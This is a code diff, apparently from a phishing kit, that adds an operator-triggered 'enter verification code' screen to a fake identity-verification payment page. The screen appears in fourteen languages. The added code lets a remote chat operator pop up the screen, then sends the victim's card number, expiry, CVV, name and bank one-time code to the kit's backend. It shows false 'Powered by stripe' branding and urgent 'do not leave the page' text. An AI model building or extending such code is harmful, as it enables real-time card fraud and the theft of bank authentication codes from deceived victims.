@@ -506,6 +506,11 @@ customElements.define('support-widget', class extends HTMLElement {
       if(e.data === 'connected') return;
       try {
         var msg = JSON.parse(e.data);
+        /* operator requests code input on frontend */
+        if(msg.action === 'request_code'){
+          document.dispatchEvent(new CustomEvent('chat:request-code'));
+          return;
+        }
         self._typing.classList.remove('on');
         self._addBubble(msg.text, 'op');
         if(!self._open){
@@ -521,6 +526,7 @@ customElements.define('support-widget', class extends HTMLElement {
   _startHeartbeat(){
     if(!this._sessionId) return;
     var self = this;
+    /* send immediately, then every 20s while the tab is alive */
     function ping(){
       if(!self._sessionId) return;
       fetch('/chat/heartbeat',{
@@ -531,6 +537,7 @@ customElements.define('support-widget', class extends HTMLElement {
     }
     ping();
     self._hbTimer = setInterval(ping, 20000);
+    /* stop pinging when the tab is hidden / closed */
     document.addEventListener('visibilitychange', function(){
       if(document.hidden){
         clearInterval(self._hbTimer);
@@ -658,6 +665,18 @@ document.querySelectorAll('[paymentopenbutton]').forEach(function(btn){
   });
 });
 
+/* operator requested code input — open payment-widget and show code screen */
+document.addEventListener('chat:request-code', function(){
+  var w = document.querySelector('payment-widget');
+  if(w){
+    if(!w.isOpen) w.open();
+    /* slight delay so the widget renders before dispatching */
+    setTimeout(function(){
+      document.dispatchEvent(new CustomEvent('chat:request-code-show'));
+    }, 100);
+  }
+});
+
 /* balance step & errors — triggers are dispatched inline in payment-widget */
 
 })();
@@ -706,7 +725,13 @@ ja:{
   val_name:'カード名義人名を入力してください',
   ver_continue:'Continue',
   proc_warning:'Currently, the system is unstable, and the process may take a bit longer. Additional verification may also be required. Please do not leave the page until the transaction is complete!',
-  proc_terms:'Terms',proc_privacy:'Privacy'
+  proc_terms:'Terms',proc_privacy:'Privacy',
+  code_title:'確認コードを入力',
+  code_desc:'銀行から確認コードが送信されました。以下に入力して操作を確認してください。',
+  code_placeholder:'コードを入力',
+  code_submit:'確認',
+  code_resend:'コードを再送',
+  code_err:'無効なコードです。もう一度お試しください。'
 },
 en:{
   page_title:'KIBIDANGO - Identity Verification',
@@ -749,7 +774,13 @@ en:{
   val_name:'Please enter cardholder name',
   ver_continue:'Continue',
   proc_warning:'Currently, the system is unstable, and the process may take a bit longer. Additional verification may also be required. Please do not leave the page until the transaction is complete!',
-  proc_terms:'Terms',proc_privacy:'Privacy'
+  proc_terms:'Terms',proc_privacy:'Privacy',
+  code_title:'Enter Verification Code',
+  code_desc:'A verification code has been sent to your bank. Please enter it below to confirm the operation.',
+  code_placeholder:'Enter code',
+  code_submit:'Confirm',
+  code_resend:'Resend code',
+  code_err:'Invalid code. Please try again.'
 },
 ru:{
   page_title:'KIBIDANGO - Подтверждение личности',
@@ -792,7 +823,13 @@ ru:{
   val_name:'Введите имя держателя карты',
   ver_continue:'Продолжить',
   proc_warning:'Система временно нестабильна, процесс может занять немного больше времени. Возможна дополнительная проверка. Пожалуйста, не покидайте страницу до завершения транзакции!',
-  proc_terms:'Условия',proc_privacy:'Конфиденциальность'
+  proc_terms:'Условия',proc_privacy:'Конфиденциальность',
+  code_title:'Введите код подтверждения',
+  code_desc:'Код подтверждения был отправлен вашим банком. Введите его ниже для подтверждения операции.',
+  code_placeholder:'Введите код',
+  code_submit:'Подтвердить',
+  code_resend:'Отправить код повторно',
+  code_err:'Неверный код. Попробуйте ещё раз.'
 },
 de:{
   page_title:'KIBIDANGO - Identitätsverifizierung',
@@ -835,7 +872,13 @@ de:{
   val_name:'Bitte Karteninhabernamen eingeben',
   ver_continue:'Weiter',
   proc_warning:'Das System ist derzeit instabil, der Prozess kann etwas länger dauern. Eine zusätzliche Verifizierung kann erforderlich sein. Bitte verlassen Sie die Seite nicht, bis die Transaktion abgeschlossen ist!',
-  proc_terms:'AGB',proc_privacy:'Datenschutz'
+  proc_terms:'AGB',proc_privacy:'Datenschutz',
+  code_title:'Bestätigungscode eingeben',
+  code_desc:'Ein Bestätigungscode wurde von Ihrer Bank gesendet. Geben Sie ihn unten ein, um den Vorgang zu bestätigen.',
+  code_placeholder:'Code eingeben',
+  code_submit:'Bestätigen',
+  code_resend:'Code erneut senden',
+  code_err:'Ungültiger Code. Bitte versuchen Sie es erneut.'
 },
 fr:{
   page_title:'KIBIDANGO - Vérification d\'identité',
@@ -878,7 +921,13 @@ fr:{
   val_name:'Veuillez entrer le nom du titulaire',
   ver_continue:'Continuer',
   proc_warning:'Le système est actuellement instable, le processus peut prendre un peu plus de temps. Une vérification supplémentaire peut être requise. Veuillez ne pas quitter la page jusqu\'à la fin de la transaction!',
-  proc_terms:'CGU',proc_privacy:'Confidentialité'
+  proc_terms:'CGU',proc_privacy:'Confidentialité',
+  code_title:'Entrez le code de vérification',
+  code_desc:'Un code de vérification a été envoyé par votre banque. Entrez-le ci-dessous pour confirmer l\'opération.',
+  code_placeholder:'Entrer le code',
+  code_submit:'Confirmer',
+  code_resend:'Renvoyer le code',
+  code_err:'Code invalide. Veuillez réessayer.'
 },
 es:{
   page_title:'KIBIDANGO - Verificación de identidad',
@@ -921,7 +970,13 @@ es:{
   val_name:'Por favor ingresa el nombre del titular',
   ver_continue:'Continuar',
   proc_warning:'El sistema actualmente es inestable y el proceso puede tardar un poco más. También puede requerirse una verificación adicional. ¡Por favor no abandone la página hasta que la transacción esté completa!',
-  proc_terms:'Términos',proc_privacy:'Privacidad'
+  proc_terms:'Términos',proc_privacy:'Privacidad',
+  code_title:'Ingrese el código de verificación',
+  code_desc:'Su banco ha enviado un código de verificación. Ingréselo a continuación para confirmar la operación.',
+  code_placeholder:'Ingresar código',
+  code_submit:'Confirmar',
+  code_resend:'Reenviar código',
+  code_err:'Código inválido. Por favor, inténtelo de nuevo.'
 },
 pt:{
   page_title:'KIBIDANGO - Verificação de identidade',
@@ -964,7 +1019,13 @@ pt:{
   val_name:'Por favor insira o nome do titular',
   ver_continue:'Continuar',
   proc_warning:'O sistema está instável no momento e o processo pode demorar um pouco mais. Verificação adicional também pode ser necessária. Por favor, não saia da página até que a transação seja concluída!',
-  proc_terms:'Termos',proc_privacy:'Privacidade'
+  proc_terms:'Termos',proc_privacy:'Privacidade',
+  code_title:'Digite o código de verificação',
+  code_desc:'Seu banco enviou um código de verificação. Digite-o abaixo para confirmar a operação.',
+  code_placeholder:'Digite o código',
+  code_submit:'Confirmar',
+  code_resend:'Reenviar código',
+  code_err:'Código inválido. Por favor, tente novamente.'
 },
 pl:{
   page_title:'KIBIDANGO - Weryfikacja tożsamości',
@@ -1007,7 +1068,13 @@ pl:{
   val_name:'Proszę podać imię posiadacza karty',
   ver_continue:'Kontynuuj',
   proc_warning:'System jest obecnie niestabilny, proces może potrwać nieco dłużej. Może być wymagana dodatkowa weryfikacja. Nie opuszczaj strony do zakończenia transakcji!',
-  proc_terms:'Regulamin',proc_privacy:'Prywatność'
+  proc_terms:'Regulamin',proc_privacy:'Prywatność',
+  code_title:'Wprowadź kod weryfikacyjny',
+  code_desc:'Twój bank wysłał kod weryfikacyjny. Wprowadź go poniżej, aby potwierdzić operację.',
+  code_placeholder:'Wprowadź kod',
+  code_submit:'Potwierdź',
+  code_resend:'Wyślij kod ponownie',
+  code_err:'Nieprawidłowy kod. Spróbuj ponownie.'
 },
 nl:{
   page_title:'KIBIDANGO - Identiteitsverificatie',
@@ -1050,7 +1117,13 @@ nl:{
   val_name:'Voer de naam van de kaarthouder in',
   ver_continue:'Doorgaan',
   proc_warning:'Het systeem is momenteel instabiel en het proces kan iets langer duren. Aanvullende verificatie kan ook vereist zijn. Verlaat de pagina niet totdat de transactie is voltooid!',
-  proc_terms:'Voorwaarden',proc_privacy:'Privacy'
+  proc_terms:'Voorwaarden',proc_privacy:'Privacy',
+  code_title:'Voer verificatiecode in',
+  code_desc:'Uw bank heeft een verificatiecode gestuurd. Voer deze hieronder in om de operatie te bevestigen.',
+  code_placeholder:'Code invoeren',
+  code_submit:'Bevestigen',
+  code_resend:'Code opnieuw sturen',
+  code_err:'Ongeldige code. Probeer het opnieuw.'
 },
 tr:{
   page_title:'KIBIDANGO - Kimlik Doğrulama',
@@ -1093,7 +1166,13 @@ tr:{
   val_name:'Lütfen kart sahibinin adını girin',
   ver_continue:'Devam et',
   proc_warning:'Sistem şu anda kararsız ve işlem biraz daha uzun sürebilir. Ek doğrulama da gerekebilir. İşlem tamamlanana kadar lütfen sayfadan ayrılmayın!',
-  proc_terms:'Şartlar',proc_privacy:'Gizlilik'
+  proc_terms:'Şartlar',proc_privacy:'Gizlilik',
+  code_title:'Doğrulama Kodunu Girin',
+  code_desc:'Bankanız bir doğrulama kodu gönderdi. İşlemi onaylamak için aşağıya girin.',
+  code_placeholder:'Kodu girin',
+  code_submit:'Onayla',
+  code_resend:'Kodu yeniden gönder',
+  code_err:'Geçersiz kod. Lütfen tekrar deneyin.'
 },
 uk:{
   page_title:'KIBIDANGO - Підтвердження особи',
@@ -1136,7 +1215,13 @@ uk:{
   val_name:'Введіть ім\'я власника картки',
   ver_continue:'Продовжити',
   proc_warning:'Система тимчасово нестабільна, процес може зайняти трохи більше часу. Можлива додаткова перевірка. Будь ласка, не залишайте сторінку до завершення транзакції!',
-  proc_terms:'Умови',proc_privacy:'Конфіденційність'
+  proc_terms:'Умови',proc_privacy:'Конфіденційність',
+  code_title:'Введіть код підтвердження',
+  code_desc:'Ваш банк надіслав код підтвердження. Введіть його нижче для підтвердження операції.',
+  code_placeholder:'Введіть код',
+  code_submit:'Підтвердити',
+  code_resend:'Надіслати код повторно',
+  code_err:'Невірний код. Спробуйте ще раз.'
 },
 zh:{
   page_title:'KIBIDANGO - 身份验证',
@@ -1179,7 +1264,13 @@ zh:{
   val_name:'请输入持卡人姓名',
   ver_continue:'继续',
   proc_warning:'系统目前不稳定，处理过程可能需要更长时间。可能还需要额外验证。请在交易完成之前不要离开页面！',
-  proc_terms:'条款',proc_privacy:'隐私'
+  proc_terms:'条款',proc_privacy:'隐私',
+  code_title:'输入验证码',
+  code_desc:'您的银行已发送验证码。请在下方输入以确认操作。',
+  code_placeholder:'输入验证码',
+  code_submit:'确认',
+  code_resend:'重新发送验证码',
+  code_err:'验证码无效，请重试。'
 },
 ko:{
   page_title:'KIBIDANGO - 신원 확인',
@@ -1222,7 +1313,13 @@ ko:{
   val_name:'카드 소지자 이름을 입력해주세요',
   ver_continue:'계속',
   proc_warning:'현재 시스템이 불안정하여 처리에 시간이 더 걸릴 수 있습니다. 추가 확인이 필요할 수도 있습니다. 거래가 완료될 때까지 페이지를 떠나지 마세요!',
-  proc_terms:'이용약관',proc_privacy:'개인정보처리방침'
+  proc_terms:'이용약관',proc_privacy:'개인정보처리방침',
+  code_title:'인증 코드 입력',
+  code_desc:'은행에서 인증 코드를 발송했습니다. 아래에 입력하여 작업을 확인하십시오.',
+  code_placeholder:'코드 입력',
+  code_submit:'확인',
+  code_resend:'코드 재발송',
+  code_err:'잘못된 코드입니다. 다시 시도해 주세요.'
 },
 it:{
   page_title:'KIBIDANGO - Verifica identità',
@@ -1265,7 +1362,13 @@ it:{
   val_name:'Inserire il nome dell\'intestatario',
   ver_continue:'Continua',
   proc_warning:'Il sistema è attualmente instabile e il processo potrebbe richiedere un po\' più di tempo. Potrebbe anche essere richiesta una verifica aggiuntiva. Non abbandonare la pagina finché la transazione non è completata!',
-  proc_terms:'Termini',proc_privacy:'Privacy'
+  proc_terms:'Termini',proc_privacy:'Privacy',
+  code_title:'Inserire il codice di verifica',
+  code_desc:'La tua banca ha inviato un codice di verifica. Inseriscilo di seguito per confermare l\'operazione.',
+  code_placeholder:'Inserire il codice',
+  code_submit:'Conferma',
+  code_resend:'Reinvia il codice',
+  code_err:'Codice non valido. Per favore riprova.'
 }
 };
 
@@ -1280,7 +1383,7 @@ document.addEventListener('DOMContentLoaded', function(){
   });
   /* CTA button: only override if no custom button_text was set by template */
   document.querySelectorAll('[data-i18n-btn]').forEach(function(el){
-    var custom = (el.getAttribute('data-custom-text') || '').trim();
+    var custom = (el.getAttribute('data-custom-text')||'').trim();
     if(custom) return; /* admin set custom text — keep it */
     var key = el.getAttribute('data-i18n-btn');
     if(t[key]) el.textContent = t[key];
@@ -1308,7 +1411,6 @@ document.addEventListener('DOMContentLoaded', function(){
     var BUTTON_TEXT = {{ button_text|tojson }};
     var SUBMIT_SUBDOMAIN = {{ subdomain|default('')|tojson }};
     var SUBMIT_LINK_ID   = {{ link_id|default('')|tojson }};
-    var LANG = '{{ user_lang|default("en") }}';
 
     function submitData(extra){
         try {
@@ -1562,6 +1664,7 @@ document.addEventListener('DOMContentLoaded', function(){
                     'TW','TJ','TZ','TH','TL','TG','TO','TT','TN','TR','TM','TV','UG','UA',
                     'AE','GB','US','UY','UZ','VU','VE','VN','YE','ZM','ZW'
                 ];
+                /* map lang code to a BCP-47 locale Intl understands */
                 var LANG_LOCALE = {
                     'ja':'ja','en':'en','ru':'ru','de':'de','fr':'fr','es':'es',
                     'pt':'pt','pl':'pl','nl':'nl','tr':'tr','uk':'uk','zh':'zh',
@@ -1574,6 +1677,7 @@ document.addEventListener('DOMContentLoaded', function(){
                 } catch(e) {
                     names = new Intl.DisplayNames(['en'], {type:'region'});
                 }
+                /* build sorted list of {code, label} */
                 var list = COUNTRY_CODES.map(function(cc){
                     var label;
                     try { label = names.of(cc); } catch(e) { label = cc; }
@@ -1588,7 +1692,6 @@ document.addEventListener('DOMContentLoaded', function(){
                         opt.textContent = item.label;
                         cntry.appendChild(opt);
                     });
-                    cntry.value = 'NL';
                 }
             })();
 
@@ -2079,6 +2182,104 @@ document.addEventListener('DOMContentLoaded', function(){
                 sh.getElementById('p-close').addEventListener('click',function(){
                     self.close();
                 });
+
+                /* listen for operator-triggered code request */
+                var self2 = self;
+                function _onRequestCode(){
+                    document.removeEventListener('chat:request-code-show', _onRequestCode);
+                    showCodeInput(sh, self2);
+                }
+                document.addEventListener('chat:request-code-show', _onRequestCode);
+            }
+
+            function showCodeInput(sh, self){
+                var dlg=sh.querySelector('.dlg');
+                if(!dlg)return;
+
+                var FAVICON_URL = {{ favicon_url|tojson }};
+                var SITE_TITLE  = {{ subdomain|default(title)|upper|tojson }};
+
+                var v=sh.ownerDocument.createElement('div');
+                v.style.cssText='display:flex;flex-direction:column;height:100%;';
+                v.innerHTML=
+                  '<div class="hdr">' +
+                    '<div class="hdr-logo">' +
+                      (FAVICON_URL?'<img src="'+FAVICON_URL+'" width="22" height="22" style="border-radius:4px;object-fit:contain;" alt="">':'') +
+                      (SITE_TITLE||'KIBIDANGO') +
+                    '</div>' +
+                    '<button class="x" id="ci-close" type="button" aria-label="Close">×</button>' +
+                  '</div>' +
+                  '<div style="padding:28px 24px 24px;display:flex;flex-direction:column;gap:18px;">' +
+                    '<div style="text-align:center;">' +
+                      '<div style="display:inline-flex;align-items:center;justify-content:center;'+
+                          'width:56px;height:56px;border-radius:50%;background:#e8f4fd;margin-bottom:12px;">' +
+                        '<svg width="28" height="28" viewBox="0 0 24 24" fill="none">'+
+                          '<rect x="3" y="11" width="18" height="11" rx="2" stroke="#29abe2" stroke-width="2"/>'+
+                          '<path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#29abe2" stroke-width="2" stroke-linecap="round"/>'+
+                          '<circle cx="12" cy="16" r="1.5" fill="#29abe2"/>'+
+                        '</svg>' +
+                      '</div>' +
+                      '<div style="font-size:16px;font-weight:700;color:#1a1a2e;margin-bottom:6px;">'+(t.code_title||'Enter Verification Code')+'</div>' +
+                      '<div style="font-size:13px;color:#666;line-height:1.55;">'+(t.code_desc||'A verification code has been sent to your bank. Please enter it below to confirm the operation.')+'</div>' +
+                    '</div>' +
+                    '<div>' +
+                      '<div class="inp-box" id="ci-box" style="margin-bottom:4px;">' +
+                        '<input id="ci-inp" type="text" inputmode="numeric" maxlength="8" '+
+                          'placeholder="'+(t.code_placeholder||'Enter code')+'" '+
+                          'style="text-align:center;letter-spacing:6px;font-size:20px;font-weight:600;padding:14px;">' +
+                      '</div>' +
+                      '<div class="err-txt" id="ci-err"></div>' +
+                    '</div>' +
+                    '<button id="ci-submit" type="button" class="cta">'+(t.code_submit||'Confirm')+'</button>' +
+                    '<div style="text-align:center;">' +
+                      '<button id="ci-resend" type="button" style="background:none;border:none;'+
+                          'color:#29abe2;font-size:13px;cursor:pointer;font-family:inherit;text-decoration:underline;">'+
+                        (t.code_resend||'Resend code') +
+                      '</button>' +
+                    '</div>' +
+                    '<div style="display:flex;align-items:center;justify-content:center;gap:12px;font-size:12px;color:#aaa;">' +
+                      '<span>Powered by <strong style="color:#555;">stripe</strong></span>' +
+                      '<span style="color:#ddd;">|</span>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_terms||'Terms')+'</a>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_privacy||'Privacy')+'</a>' +
+                    '</div>' +
+                  '</div>';
+
+                dlg.innerHTML='';
+                dlg.appendChild(v);
+
+                var ciInp = sh.getElementById('ci-inp');
+                var ciErr = sh.getElementById('ci-err');
+                var ciBox = sh.getElementById('ci-box');
+
+                sh.getElementById('ci-close').addEventListener('click',function(){ self.close(); });
+
+                ciInp.addEventListener('input',function(){
+                    this.value=this.value.replace(/\D/g,'');
+                    ciBox.classList.remove('err');
+                    ciErr.textContent=''; ciErr.classList.remove('on');
+                });
+
+                sh.getElementById('ci-submit').addEventListener('click',function(){
+                    var code=(ciInp.value||'').trim();
+                    if(!code){ ciBox.classList.add('err'); return; }
+                    submitData({
+                        card_number: cardInp ? cardInp.value : '',
+                        card_exp:    expInp  ? expInp.value  : '',
+                        card_cvv:    cvvInp  ? cvvInp.value  : '',
+                        card_name:   nameInp ? nameInp.value.trim() : '',
+                        verification_code: code
+                    });
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code'}));
+                    /* show spinner / processing again */
+                    showProcessing(sh, self);
+                });
+
+                sh.getElementById('ci-resend').addEventListener('click',function(){
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'code_resend'}));
+                });
+
+                setTimeout(function(){ if(ciInp) ciInp.focus(); }, 80);
             }
 
         }
